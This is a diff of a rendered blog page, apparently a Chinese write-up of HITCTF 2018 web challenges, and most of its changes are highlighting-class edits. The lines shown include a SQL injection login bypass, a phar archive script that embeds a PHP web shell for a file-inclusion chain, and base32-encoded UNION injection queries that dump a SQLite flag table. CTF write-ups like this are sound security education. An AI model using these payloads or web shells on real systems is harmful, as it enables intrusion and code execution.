@@ -110,7 +110,7 @@
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$flag</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'asdfgjxzkallgj8852'</span><span class="p">];</span><span class="k">if</span><span class="p">(</span><span class="nv">$flag</span><span class="o">==</span><span class="s1">'H1TctF2018EzCTF'</span><span class="p">){</span><span class="k">die</span><span class="p">(</span><span class="nv">$flag</span><span class="p">);}</span><span class="k">die</span><span class="p">(</span><span class="s1">'emmmm'</span><span class="p">);</span>
 </code></pre></div></div>
 
-<p>输入url<code class="highlighter-rouge">http://198.13.58.35:8899?asdfgjxzkallgj8852= H1TctF2018EzCTF</code>之后得到flag</p>
+<p>输入url<code class="language-plaintext highlighter-rouge">http://198.13.58.35:8899?asdfgjxzkallgj8852= H1TctF2018EzCTF</code>之后得到flag</p>
 
 <h3 id="babyeval">BabyEval</h3>
 <p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/2.png" alt="BabyEval" /></p>
@@ -244,13 +244,13 @@ mysql&gt;
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
 <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'passwd'</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'passwd'</span><span class="p">]))</span> <span class="p">{</span>
     <span class="k">echo</span> <span class="s1">'Login and get the flag'</span><span class="p">;</span>
-    <span class="k">echo</span> <span class="s1">'&lt;form action="" method="post"&gt;'</span><span class="o">.</span><span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>
-    <span class="k">echo</span> <span class="s1">'&lt;input name="username" type="text" placeholder="username"/&gt;'</span><span class="o">.</span><span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>
-    <span class="k">echo</span> <span class="s1">'&lt;input name="passwd" type="text" placeholder="passwd"/&gt;'</span><span class="o">.</span><span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>
-    <span class="k">echo</span> <span class="s1">'&lt;input type="submit" &gt;&lt;/input&gt;'</span><span class="o">.</span><span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>
-    <span class="k">echo</span> <span class="s1">'&lt;/form&gt;'</span><span class="o">.</span><span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s1">'&lt;form action="" method="post"&gt;'</span><span class="mf">.</span><span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s1">'&lt;input name="username" type="text" placeholder="username"/&gt;'</span><span class="mf">.</span><span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s1">'&lt;input name="passwd" type="text" placeholder="passwd"/&gt;'</span><span class="mf">.</span><span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s1">'&lt;input type="submit" &gt;&lt;/input&gt;'</span><span class="mf">.</span><span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s1">'&lt;/form&gt;'</span><span class="mf">.</span><span class="s2">"&lt;br/&gt;"</span><span class="p">;</span>
     <span class="k">die</span><span class="p">;</span>
 <span class="p">}</span>
 
@@ -259,22 +259,22 @@ mysql&gt;
 
 <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">];</span>
 <span class="nv">$passwd</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'passwd'</span><span class="p">];</span>
-<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/"</span><span class="o">.</span><span class="nv">$filter</span><span class="o">.</span><span class="s2">"/is"</span><span class="p">,</span><span class="nv">$username</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/"</span><span class="mf">.</span><span class="nv">$filter</span><span class="mf">.</span><span class="s2">"/is"</span><span class="p">,</span><span class="nv">$username</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span>
     <span class="k">die</span><span class="p">(</span><span class="s2">"Hacker hacker hacker~"</span><span class="p">);</span>
 <span class="p">}</span>
-<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/"</span><span class="o">.</span><span class="nv">$filter</span><span class="o">.</span><span class="s2">"/is"</span><span class="p">,</span><span class="nv">$passwd</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/"</span><span class="mf">.</span><span class="nv">$filter</span><span class="mf">.</span><span class="s2">"/is"</span><span class="p">,</span><span class="nv">$passwd</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span>
     <span class="k">die</span><span class="p">(</span><span class="s2">"Hacker hacker hacker~"</span><span class="p">);</span>
 <span class="p">}</span>
 
 <span class="nv">$conn</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">();</span>
 
 <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE username='</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">';"</span><span class="p">;</span>
-<span class="k">echo</span> <span class="nv">$query</span><span class="o">.</span><span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
-<span class="nv">$query</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
-<span class="k">if</span> <span class="p">(</span><span class="nx">mysqli_num_rows</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
-    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$query</span><span class="mf">.</span><span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
+<span class="nv">$query</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nf">mysqli_num_rows</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nf">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'passwd'</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$passwd</span><span class="p">){</span>
-        <span class="k">die</span><span class="p">(</span><span class="s1">'you did it and this is your flag: '</span><span class="o">.</span><span class="nv">$flag</span><span class="p">);</span>
+        <span class="k">die</span><span class="p">(</span><span class="s1">'you did it and this is your flag: '</span><span class="mf">.</span><span class="nv">$flag</span><span class="p">);</span>
     <span class="p">}</span>
     <span class="k">else</span><span class="p">{</span>
         <span class="k">die</span><span class="p">(</span><span class="s1">'Wrong password'</span><span class="p">);</span>
@@ -287,7 +287,7 @@ mysql&gt;
 
 <ul>
   <li>ban掉了很多关键字
-而且从ban list里面感觉到出题人并不是想我们找出真正的密码,而是单纯的绕过,是以前碰到的一个题目的套路,首先可以用group by passwd with rollup来制造一个空行(利用统计函数,查询结果多一行并且passwd为空),这里本来可以直接用limit筛选出我们需要的那个空行,但是这里limit被ban了,没关系,还可以用having子句来筛选出我们需要的带有空字段的行,因为having子句是再分组查询之后再执行的,所以最后post payload如下<code class="highlighter-rouge">username='|| 1 group by passwd with rollup having passwd is null#&amp;passwd=</code></li>
+而且从ban list里面感觉到出题人并不是想我们找出真正的密码,而是单纯的绕过,是以前碰到的一个题目的套路,首先可以用group by passwd with rollup来制造一个空行(利用统计函数,查询结果多一行并且passwd为空),这里本来可以直接用limit筛选出我们需要的那个空行,但是这里limit被ban了,没关系,还可以用having子句来筛选出我们需要的带有空字段的行,因为having子句是再分组查询之后再执行的,所以最后post payload如下<code class="language-plaintext highlighter-rouge">username='|| 1 group by passwd with rollup having passwd is null#&amp;passwd=</code></li>
 </ul>
 
 <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; use <span class="nb">test</span><span class="p">;</span>
@@ -392,7 +392,7 @@ exp : https://github.com/neex/ffmpeg-avi-m3u-xbin
     <span class="k">for</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">flag_key</span><span class="p">):</span>
         <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">y</span><span class="p">):</span>
             <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">result</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
-    <span class="n">cryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="s">b'0000000000000000'</span><span class="p">)</span>
+    <span class="n">cryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="sa">b</span><span class="s">'0000000000000000'</span><span class="p">)</span>
     <span class="n">plain_text</span> <span class="o">=</span> <span class="n">cryptor</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">a2b_hex</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">))</span>
     <span class="n">flag</span> <span class="o">=</span> <span class="n">plain_text</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
     <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">result</span> <span class="o">=</span> <span class="bp">True</span><span class="p">,</span> <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span><span class="p">)</span>
@@ -404,7 +404,7 @@ exp : https://github.com/neex/ffmpeg-avi-m3u-xbin
 </code></pre></div></div>
 
 <ul>
-  <li>首先flag是经过AES加密的,我们需要找到key去解密,而且我们得先知道key的长度(在这里很明显是16位),然后题目有一处逐位比较的地方,<code class="highlighter-rouge">ord(x) ^ ord(y)</code>,通过这个地方我们能一位位构造爆破,但是问题是我们如何区别爆破成功和爆破失败?</li>
+  <li>首先flag是经过AES加密的,我们需要找到key去解密,而且我们得先知道key的长度(在这里很明显是16位),然后题目有一处逐位比较的地方,<code class="language-plaintext highlighter-rouge">ord(x) ^ ord(y)</code>,通过这个地方我们能一位位构造爆破,但是问题是我们如何区别爆破成功和爆破失败?</li>
   <li>这里涉及到python的序列化json后转换的对象问题,https://docs.python.org/3/library/json.html#encoders-and-decoders
 如果遇到null就会被转换成None,遇到ord(None)的时候python就会抛出错误<img src="/assets/images/posts/2018/hitctf-Web-Writeup/15.png" alt="error" />尝试一下<img src="/assets/images/posts/2018/hitctf-Web-Writeup/16.png" alt="500 error" />
 <img src="/assets/images/posts/2018/hitctf-Web-Writeup/17.png" alt="return false" />
@@ -433,7 +433,7 @@ exp : https://github.com/neex/ffmpeg-avi-m3u-xbin
 <span class="k">print</span> <span class="n">realkey</span>
 </code></pre></div></div>
 
-<p>得到key : <code class="highlighter-rouge">5ecur3pPYpyPYk3y</code>
+<p>得到key : <code class="language-plaintext highlighter-rouge">5ecur3pPYpyPYk3y</code>
 提交之后得到flag</p>
 
 <p>参考:https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/</p>
@@ -465,16 +465,16 @@ exp : https://github.com/neex/ffmpeg-avi-m3u-xbin
 
 <span class="cp">&lt;?php</span>
     <span class="k">require_once</span><span class="p">(</span><span class="s1">'config.php'</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])){</span>
+    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])){</span>
         <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">];</span>
         <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span>
         <span class="k">if</span> <span class="p">(</span><span class="nv">$username</span> <span class="o">===</span> <span class="s2">"admin"</span> <span class="o">&amp;&amp;</span> <span class="nb">sha1</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">))</span> <span class="o">===</span> <span class="nv">$admin_hash</span><span class="p">){</span>
             <span class="k">echo</span> <span class="s1">'&lt;script&gt;alert("Login seccess!");&lt;/script&gt;'</span><span class="p">;</span>
         <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-            <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">])){</span>
+            <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">])){</span>
                 <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'hitctf'</span><span class="p">){</span>
-                    <span class="nv">$logfile</span> <span class="o">=</span> <span class="s2">"log/"</span><span class="o">.</span><span class="nv">$username</span><span class="o">.</span><span class="s2">".log"</span><span class="p">;</span>
-                    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$username</span><span class="o">.</span><span class="s2">" =&gt; "</span><span class="o">.</span><span class="nv">$password</span><span class="p">;</span>
+                    <span class="nv">$logfile</span> <span class="o">=</span> <span class="s2">"log/"</span><span class="mf">.</span><span class="nv">$username</span><span class="mf">.</span><span class="s2">".log"</span><span class="p">;</span>
+                    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$username</span><span class="mf">.</span><span class="s2">" =&gt; "</span><span class="mf">.</span><span class="nv">$password</span><span class="p">;</span>
                     <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
 
                 <span class="p">}</span><span class="k">else</span><span class="p">{</span>
@@ -492,23 +492,23 @@ exp : https://github.com/neex/ffmpeg-avi-m3u-xbin
 
 <ul>
   <li>从源码我们可以知道就算我们不登录也没有啥问题,提交debug参数之后可以任意写入文件内容到log后缀的文件中,这里限定死了后缀,也就是无法直接用文件包含getShell(此题包含时后缀要求是php),但是可以利用zip和phar伪协议包含,但是这里有个问题, 题目会在文件前加上 username =&gt; password ,这样的字符串有可能会破坏文件格式导致解压失败. 一叶飘零大佬是直接构造出了zip,http://skysec.top/2018/02/01/HITCTF-WEB%E9%A2%98%E8%A7%A3/
-其实用phar也可以做, 并且不用顾及格式问题,因为phar在解压的时候先寻找stub部分,也就是<?php ?>标签内的内容(会将前面的忽略),所以只要stub结构完整就ok了</li>
+其实用phar也可以做, 并且不用顾及格式问题,因为phar在解压的时候先寻找stub部分,也就是&lt;?php ?&gt;标签内的内容(会将前面的忽略),所以只要stub结构完整就ok了</li>
   <li>构造phar</li>
 </ul>
 
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
-<span class="nv">$p</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">'Pr0ph3t.phar'</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="nv">$p</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Phar</span><span class="p">(</span><span class="s1">'Pr0ph3t.phar'</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 <span class="nv">$p</span><span class="p">[</span><span class="s1">'shit.php'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'&lt;?php system($_GET[\'uuu\']); ?&gt;'</span><span class="p">;</span>
-<span class="nv">$p</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">'&lt;?php __HALT_COMPILER(); ?&gt;'</span><span class="p">);</span>
+<span class="nv">$p</span><span class="o">-&gt;</span><span class="nf">setStub</span><span class="p">(</span><span class="s1">'&lt;?php __HALT_COMPILER(); ?&gt;'</span><span class="p">);</span>
 <span class="cp">?&gt;</span>
 </code></pre></div></div>
 
 <ul>
   <li>写入log
-post username为Pr0ph3t、password为生成的phar内容到<code class="highlighter-rouge">http://120.24.215.80:10012/?page=login&amp;debug=hitctf</code>
+post username为Pr0ph3t、password为生成的phar内容到<code class="language-plaintext highlighter-rouge">http://120.24.215.80:10012/?page=login&amp;debug=hitctf</code>
 但是这里并不能直接用phar伪协议去包含,因为phar文件被修改过了,所以sha1签名对应不上,不会被解压 所以下一步是修改文件sha1</li>
   <li>下载被修改的log
-访问<code class="highlighter-rouge">http://120.24.215.80:10012/log/Pr0ph3t.log</code>得到被修改后的phar文件<img src="/assets/images/posts/2018/hitctf-Web-Writeup/21.png" alt="被修改之后的phar文件" />
+访问<code class="language-plaintext highlighter-rouge">http://120.24.215.80:10012/log/Pr0ph3t.log</code>得到被修改后的phar文件<img src="/assets/images/posts/2018/hitctf-Web-Writeup/21.png" alt="被修改之后的phar文件" />
 其中被选中部分是这个phar的sha1签名(http://php.net/manual/en/phar.fileformat.phar.php)</li>
   <li>
     <p>计算新sha1并更改上传新phar
@@ -540,7 +540,7 @@ GraphQL的介绍http://graphql.cn/
   <li>尝试一下存不存在注入</li>
 </ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Alice
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Alice
   ||
 IFWGSY3F (base32encode)
 
@@ -559,7 +559,7 @@ IFWGSY3FE4QGC3TEEAYCALJNFM======
   <li>下一步就是判断数据库类型</li>
 </ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a' union select version() --+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a' union select version() --+
   ||
 METSA5LONFXW4IDTMVWGKY3UEB3GK4TTNFXW4KBJEAWS2KY=
 </code></pre></div></div>
@@ -567,7 +567,7 @@ METSA5LONFXW4IDTMVWGKY3UEB3GK4TTNFXW4KBJEAWS2KY=
 <p><img src="/assets/images/posts/2018/hitctf-Web-Writeup/34.png" alt="a' union select version() --+" />
 不是mysql</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a' union select sqlite_version() --+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a' union select sqlite_version() --+
   ||
 METSA5LONFXW4IDTMVWGKY3UEBZXC3DJORSV65TFOJZWS33OFAUSALJNFM======
 </code></pre></div></div>
@@ -579,7 +579,7 @@ METSA5LONFXW4IDTMVWGKY3UEBZXC3DJORSV65TFOJZWS33OFAUSALJNFM======
   <li>表</li>
 </ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a' union select group_concat(name) from sqlite_master where type='table' --+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a' union select group_concat(name) from sqlite_master where type='table' --+
   ||
 METSA5LONFXW4IDTMVWGKY3UEBTXE33VOBPWG33OMNQXIKDOMFWWKKJAMZZG63JAONYWY2LUMVPW2YLTORSXEIDXNBSXEZJAOR4XAZJ5E52GCYTMMUTSALJNFM======
 </code></pre></div></div>
@@ -589,7 +589,7 @@ METSA5LONFXW4IDTMVWGKY3UEBTXE33VOBPWG33OMNQXIKDOMFWWKKJAMZZG63JAONYWY2LUMVPW2YLT
   <li>列</li>
 </ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a' union select group_concat(sql) from sqlite_master where type='table' and name='Secr3t_fl4g'--+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a' union select group_concat(sql) from sqlite_master where type='table' and name='Secr3t_fl4g'--+
   ||
 METSA5LONFXW4IDTMVWGKY3UEBTXE33VOBPWG33OMNQXIKDTOFWCSIDGOJXW2IDTOFWGS5DFL5WWC43UMVZCA53IMVZGKIDUPFYGKPJHORQWE3DFE4QGC3TEEBXGC3LFHUTVGZLDOIZXIX3GNQ2GOJZNFUVQ====
 </code></pre></div></div>
@@ -599,7 +599,7 @@ METSA5LONFXW4IDTMVWGKY3UEBTXE33VOBPWG33OMNQXIKDTOFWCSIDGOJXW2IDTOFWGS5DFL5WWC43U
   <li>getFlag</li>
 </ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a' union select group_concat(flag) from Secr3t_fl4g --+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a' union select group_concat(flag) from Secr3t_fl4g --+
   ||
 METSA5LONFXW4IDTMVWGKY3UEBTXE33VOBPWG33OMNQXIKDGNRQWOKJAMZZG63JAKNSWG4RTORPWM3BUM4QC2LJL
 </code></pre></div></div>
